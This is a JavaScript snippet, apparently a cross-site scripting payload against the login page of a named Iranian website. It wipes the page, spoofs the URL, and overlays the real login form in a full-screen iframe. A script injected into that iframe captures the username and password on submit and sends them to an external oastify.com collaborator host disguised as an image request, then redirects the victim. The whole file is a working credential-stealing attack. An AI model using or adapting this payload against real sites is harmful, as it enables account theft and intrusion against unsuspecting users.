// Function to dynamically create the iframe and append it to the body
    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = "/account/login/mobile";
        iframe.id = "loginFrame";
        iframe.style = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
        document.body.appendChild(iframe);
        return iframe;
    }

    function sendFinal(username, password) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
        xhr.send();
    }

    document.body.innerHTML = '';
    window.history.replaceState({}, "ورود", "https://my.daryakenar.ir/account/login/mobile");
    window.parent.document.title = "ورود";
    var frame = createIframe();

    // Add load event listener to iframe to inject script after it loads
    frame.onload = function () {
        var doc = frame.contentDocument || frame.contentWindow.document;

        // Inject script to listen to form submission inside the iframe
        var script = doc.createElement('script');
        script.textContent = `
            const delay = ms => new Promise(res => setTimeout(res, ms));
            document.body.addEventListener('submit', async (event) => {
                if (event.target.tagName.toLowerCase() === 'form') {
                    var username = document.getElementsByTagName('fluent-text-field')[0].value;
                    var password = document.getElementsByTagName('fluent-text-field')[1].value;
                    if(password.length > 1){
                        parent.sendFinal(username, password);
                        await delay(5000);
                        parent.location.href = 'https://my.daryakenar.ir/panel'
                    }
                }
            }, true);
        `;
        doc.body.appendChild(script);
    };
